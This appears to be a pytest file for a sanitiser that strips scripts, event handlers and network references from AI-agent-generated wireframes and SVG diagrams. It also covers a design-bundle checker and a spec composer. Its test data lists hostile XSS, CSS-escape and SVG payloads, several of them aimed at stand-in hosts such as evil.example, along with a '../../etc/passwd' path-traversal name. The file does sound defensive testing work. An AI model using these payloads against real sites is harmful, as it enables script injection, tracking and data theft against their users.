"""Design outputs are static and offline (§11.2, §12, §16.20): whatever an agent hands back,
a stored wireframe or flow has no scripts, no event handlers and nothing that reaches the
network, and is grayscale. Pure functions; no database."""

import json
import uuid

import pytest

from oracle.specs.contract import RequirementRef, SpecInputs, compose, part_of
from oracle.specs.design import check_design
from oracle.specs.sanitize import (
    DOWNLOAD_CSP,
    sanitize_svg,
    sanitize_wireframe,
    static_problems,
)
from tests.specs_helpers import FLOW_SVG, design_json, spec_md, wireframe_html

SVG_HEAD = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'

HOSTILE_HTML = [
    "<script>fetch('/v1/me')</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    '<img src="https://tracker.example/p.gif">',
    "<img src=x onerror=alert(1)>",
    '<div onclick="steal()">x</div>',
    '<a href="javascript:alert(1)">x</a>',
    '<a href="https://evil.example">x</a>',
    '<a href="//evil.example">x</a>',
    '<iframe src="https://evil.example"></iframe>',
    '<object data="x.swf"></object>',
    '<embed src="x">',
    '<link rel="stylesheet" href="https://cdn.example/x.css">',
    '<base href="https://evil.example/">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    "<style>@import url(https://evil.example/x.css);</style>",
    "<style>body{background:url(https://tracker.example/p.gif)}</style>",
    "<style>body{background:u\\72l(https://x)}</style>",
    '<div style="background-image:url(https://tracker.example/p.gif)">x</div>',
    '<div style="width:expression(alert(1))">x</div>',
    '<form action="https://evil.example/collect"><input name="q"></form>',
    '<button formaction="https://evil.example">x</button>',
    '<input type="image" src="https://tracker.example/b.png">',
    '<video src="https://evil.example/v.mp4"></video>',
    "<!--[if IE]><script>alert(1)</script><![endif]-->",
    "<svg><script>alert(1)</script></svg>",
]

HOSTILE_SVG = [
    SVG_HEAD + "<script>alert(1)</script></svg>",
    SVG_HEAD + '<rect onload="alert(1)"/></svg>',
    SVG_HEAD + '<image href="https://tracker.example/p.png"/></svg>',
    SVG_HEAD + '<a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
    SVG_HEAD + '<use xlink:href="https://evil.example/sprite.svg#a"/></svg>',
    SVG_HEAD + '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">x</div>'
    "</foreignObject></svg>",
    SVG_HEAD + '<rect style="fill:url(https://evil.example/p.svg#g)"/></svg>',
    SVG_HEAD + '<rect fill="url(https://evil.example/p.svg#g)"/></svg>',
    SVG_HEAD + "<style>@import url(https://evil.example/x.css);</style></svg>",
    SVG_HEAD + '<animate attributeName="href" to="javascript:alert(1)"/></svg>',
    SVG_HEAD + '<set attributeName="onmouseover" to="alert(1)"/></svg>',
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "y">]>' + SVG_HEAD + "<text>&x;</text></svg>",
    '<!DOCTYPE svg SYSTEM "https://evil.example/svg.dtd">' + SVG_HEAD + "</svg>",
    "<html><script>alert(1)</script></html>",
    "not xml at all <",
]


@pytest.mark.parametrize("fragment", HOSTILE_HTML)
def test_hostile_wireframe_markup_is_refused(fragment):
    out = sanitize_wireframe(f"<h1 id='t'>Cart</h1>{fragment}", title="Cart")
    assert out.blocked, fragment
    # Even the rebuilt page (never stored when blocked) is static and offline.
    assert static_problems(out.content, "html") == [] or not out.content


@pytest.mark.parametrize("candidate", HOSTILE_SVG)
def test_hostile_flow_markup_is_refused(candidate):
    out = sanitize_svg(candidate, title="Flow")
    assert out.blocked, candidate
    if out.content:
        assert static_problems(out.content, "svg") == []


def test_a_clean_wireframe_is_rebuilt_static_grayscale_and_with_a_policy():
    out = sanitize_wireframe(
        wireframe_html(1) + "<blink>old</blink><a href='#top' target='_blank'>Top</a>",
        title="Cart <1>",
        annotations=[("1. cost", "Shown <early>")],
    )
    assert out.safe, out.blocked
    html = out.content
    assert static_problems(html, "html") == []
    assert "<script" not in html.lower() and "http" not in html.replace("http-equiv", "")
    assert "filter:grayscale(100%)!important" in html  # after the agents' CSS
    assert html.index(".box{") < html.index("grayscale")
    assert "Content-Security-Policy" in html and "default-src 'none'" in html
    assert '<button type="button">Continue</button>' in html  # never a submit
    assert '<a href="#top">Top</a>' in html  # fragment links stay, target goes
    assert "<blink>" not in html and "old" in html
    assert "Cart &lt;1&gt;" in html and "Shown &lt;early&gt;" in html
    assert {"heading-1", "cost", "pc"} <= out.targets
    assert any("blink" in r for r in out.removed)


def test_a_clean_flow_keeps_local_markers_only():
    out = sanitize_svg(FLOW_SVG, title="Checkout")
    assert out.safe, out.blocked
    assert 'marker-end="url(#arrow)"' in out.content
    assert "filter:grayscale(100%)" in out.content
    assert "<title>Checkout</title>" in out.content
    assert static_problems(out.content, "svg") == []
    assert {"cart", "quote", "arrow"} <= out.targets


def test_text_is_escaped_not_interpreted():
    out = sanitize_wireframe("<p>Price &lt;b&gt; &amp; tax</p>", title="x")
    assert out.safe and "Price &lt;b&gt; &amp; tax" in out.content
    # Text that spells out a script tag is escaped, and still refused: the final check
    # reads decoded entities too, and fails closed.
    spelled = sanitize_wireframe("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>", title="x")
    assert "<script" not in spelled.content and not spelled.safe
    split = sanitize_wireframe("<p>ok</p><scr<script>ipt>alert(1)</script>", title="x")
    assert "<script" not in split.content.lower()
    assert static_problems(split.content, "html") == []
    svg = sanitize_svg(SVG_HEAD + "<text>a &lt; b &amp; c</text></svg>", title="x")
    assert svg.safe and "a &lt; b &amp; c" in svg.content


def test_the_download_policy_isolates_the_page():
    # No scripts or network, an opaque origin (no allow-same-origin): no cookies, no API.
    assert "default-src 'none'" in DOWNLOAD_CSP
    assert "sandbox" in DOWNLOAD_CSP and "allow-same-origin" not in DOWNLOAD_CSP
    assert "allow-scripts" not in DOWNLOAD_CSP
    assert "form-action 'none'" in DOWNLOAD_CSP


# --------------------------------------------------------------------------- design.json

REQS = [str(uuid.UUID(int=1)), str(uuid.UUID(int=2))]
SECTIONS = ["s-5-1", "s-5-2"]


def check(text, **kw):
    return check_design(
        text, prd_sections=set(SECTIONS) | {"problem"}, requirement_ids=set(REQS), **kw
    )


def test_a_valid_bundle_passes_with_sanitised_outputs():
    out = check(design_json(REQS, SECTIONS))
    assert out.ok, out.problems
    assert [o.name for o in out.flows] == ["checkout-flow.svg"]
    assert [o.name for o in out.wireframes] == ["cart-1.html", "cart-2.html", "cart-3.html"]
    for o in out.flows + out.wireframes:
        assert static_problems(o.content, "svg" if o.name.endswith(".svg") else "html") == []
        assert o.meta()["section_keys"] and o.meta()["requirement_ids"]
        assert o.sha256 and o.size_bytes == len(o.content.encode())


@pytest.mark.parametrize(
    ("override", "code"),
    [
        ({"version": 2}, "invalid_shape"),
        ({"flows": []}, "no_flows"),
        ({"surprise": 1}, "invalid_shape"),
    ],
)
def test_bundle_shape(override, code):
    out = check(design_json(REQS, SECTIONS, **override))
    assert code in {p.code for p in out.problems}
    assert not out.ok


def test_bundle_checks_names_counts_sizes_links_and_targets():
    bundle = json.loads(design_json(REQS, SECTIONS, screens=1))
    flow = bundle["flows"][0]
    flow["name"] = "../../etc/passwd.svg"
    flow["annotations"][0]["target"] = "nowhere"
    flow["annotations"].append(dict(flow["annotations"][0]))
    bundle["flows"].append({**flow, "name": "Big.svg", "svg": "<svg/>" + " " * 300_000})
    bundle["wireframes"][0]["section_keys"] = ["gone"]
    bundle["wireframes"][0]["requirement_ids"] = [str(uuid.uuid4())]
    codes = {p.code for p in check(json.dumps(bundle)).problems}
    assert {
        "invalid_name",
        "unknown_target",
        "duplicate_annotation",
        "file_too_large",
        "unknown_section",
        "unknown_requirement",
        "screen_count",
    } <= codes
    assert check(None).problems[0].code == "missing_file"
    assert check("{nope").problems[0].code == "invalid_json"
    assert check("x" * 1_000_001).problems[0].code == "too_large"


def test_a_wireframe_with_a_script_refuses_the_bundle():
    bundle = json.loads(design_json(REQS, SECTIONS))
    bundle["wireframes"][1]["html"] += "<script>fetch('/v1/me')</script>"
    out = check(json.dumps(bundle))
    assert not out.ok
    assert any(p.code == "unsafe_content" and "cart-2.html" in p.message for p in out.problems)


# --------------------------------------------------------------------------- contract


def inputs(**kw):
    base = dict(
        slug="checkout-redesign-early-shipping-cost-spec",
        title="Early shipping cost: engineering spec",
        depth="full",
        prd_slug="checkout-redesign",
        prd_title="Checkout redesign PRD",
        prd_version=3,
        sections=(("s-5-2", "5.2 Shipping step"),),
        requirements=(
            RequirementRef(
                id=REQS[0],
                key="req-shipping-cost",
                title="Show shipping cost on the cart",
                statement="Before the address step.",
                section_keys=("s-5-2",),
                acceptance=("Cost visible without an address",),
            ),
        ),
    )
    return SpecInputs(**{**base, **kw})


def test_compose_keeps_requirements_apart_and_labels_the_approach():
    out = compose(spec_md(extra="\n## Product requirements {#requirements}\n\nRewritten!\n"),
                  inputs())  # fmt: skip
    assert out.ok, out.problems
    md = out.markdown
    assert md.startswith("---\ndocument: checkout-redesign-early-shipping-cost-spec\n")
    assert "kind: spec" in md and "code_capability_map: unavailable" in md
    assert "Rewritten!" not in md  # Oracle writes the requirements, not the agents
    assert any(p.code == "oracle_section" for p in out.problems)
    assert "(requirement id `00000000-0000-0000-0000-000000000001`)" in md
    assert "[5.2 Shipping step](/documents/checkout-redesign/v/3#s-5-2)" in md
    assert md.index("{#open-decisions}") < md.index("# Full version {#full}")
    assert md.index("# Full version {#full}") < md.index("{#architecture}")
    assert md.rstrip().endswith("- Code capability map: not available; the approach rests on "
                                "the assumptions listed above.")  # fmt: skip
    assert md.count("based on assumptions") == 11  # every engineering approach section
    assert part_of("approach") == "engineering_approach"
    assert part_of("requirements") == "product_requirement"
    assert part_of("spec") == "context"


def test_compose_with_a_capability_map_says_proposed_only():
    out = compose(spec_md(), inputs(capability_map=True))
    assert out.ok
    assert "based on assumptions" not in out.markdown
    assert "not decided until an engineering approver approves" in out.markdown


def test_compose_lists_every_problem():
    out = compose(spec_md(skip=("approach", "assumptions"), extra="## Odd {#odd}\n\nx\n"),
                  inputs())  # fmt: skip
    assert out.markdown is None
    codes = [(p.code, p.section) for p in out.problems]
    assert ("missing_section", "approach") in codes
    assert ("missing_section", "assumptions") in codes
    assert ("unknown_section", "odd") in codes
    assert compose("x" * 200_001, inputs()).problems[0].code == "too_large"
    assert compose(spec_md(), inputs(requirements=())).problems[0].code == "no_requirements"


def test_a_tech_brief_needs_only_the_brief_sections():
    brief = compose(
        spec_md(skip=("architecture", "test-strategy", "user-flows")), inputs(depth="brief")
    )
    assert brief.ok, brief.problems
    assert "{#architecture}" not in brief.markdown
    assert any(p.code == "section_not_in_depth" for p in brief.problems)


# --------------------------------------------------------------------------- review fixes


def test_a_self_closing_style_does_not_swallow_markup_into_css():
    payload = (
        "<style/>&lt;<b>/style&gt;&lt;<b>meta http-equiv=&amp;#114;efresh "
        'content="0;url=https://evil.example/x"&gt;&lt;<b>svg/onload=alert(1)&gt;'
    )
    out = sanitize_wireframe(payload, title="x")
    head = out.content[: out.content.index("<body>")]
    assert "evil.example" not in head and "onload" not in head
    assert head.count("<style>") == 1  # Oracle's own stylesheet only
    assert static_problems(out.content, "html") == []


@pytest.mark.parametrize(
    "css",
    [
        'a{content:"/*"} b{background:u\\72l(https://evil.example/x)} c{content:"*/"}',
        '@\\69mport "https://evil.example/x.css";',
        "@font-face{font-family:x}",
        "a{background:url(  'https://evil.example/x' )}",
        "a{color:red}</style><script>alert(1)</script>",
    ],
)
def test_css_tricks_are_refused_everywhere(css):
    assert sanitize_wireframe(f"<style>{css}</style><p>x</p>", title="x").blocked
    assert sanitize_wireframe(f"<p style='{css}'>x</p>", title="x").blocked
    assert sanitize_svg(f"{SVG_HEAD}<style>{css}</style></svg>", title="x").blocked
    assert sanitize_svg(f'{SVG_HEAD}<rect style="{css}"/></svg>', title="x").blocked


def test_the_static_check_decodes_entities_and_slash_separated_handlers():
    assert static_problems('<meta http-equiv=&#114;efresh content="0">', "svg")
    assert static_problems("<svg/onload=alert(1)>", "svg")
    assert static_problems('<p class="a"onclick=alert(1)>', "svg")
